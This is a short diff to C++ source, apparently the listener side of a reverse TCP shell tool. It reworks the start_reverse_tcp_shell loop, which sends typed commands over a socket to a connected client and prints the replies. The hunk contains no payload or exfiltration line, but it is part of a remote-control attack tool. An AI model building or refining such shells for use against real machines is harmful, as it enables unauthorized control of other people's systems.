@@ -120,13 +120,17 @@ void connection_listener(int i)
 
 void start_reverse_tcp_shell(client cli)
 {
-	while(1) {
-		char buffer[1024];
-		char response[18384];
+	char buffer[1024];
+	char response[18384];
+	
+	int c;
+
+	while ( (c = getchar()) != '\n' && c != EOF ) { }
+
+	while(true) {
 		bzero(&buffer, sizeof(buffer));
 	        bzero(&response, sizeof(response));
 	        cout << "* Shell# " << cli.ip_address << " ~$: ";
-	        jump:
 	        fgets(buffer, sizeof(buffer), stdin);
 	        strtok(buffer, "\n");
 	        write(cli.id, buffer, sizeof(buffer));
@@ -146,11 +150,10 @@ void start_reverse_tcp_shell(client cli)
 			recv(cli.id, response, sizeof(response), 0);
 			cout << response << "\n";
 		}
-		else if ("" == buffer) {
-			goto jump;
-		}
-		else {
-			recv(cli.id, response, sizeof(response), MSG_WAITALL);
+		else {	
+			while(strlen(response) == 0) {
+				recv(cli.id, response, sizeof(response), MSG_WAITALL);
+			}
 			cout << response << "\n";
 		}
 	}
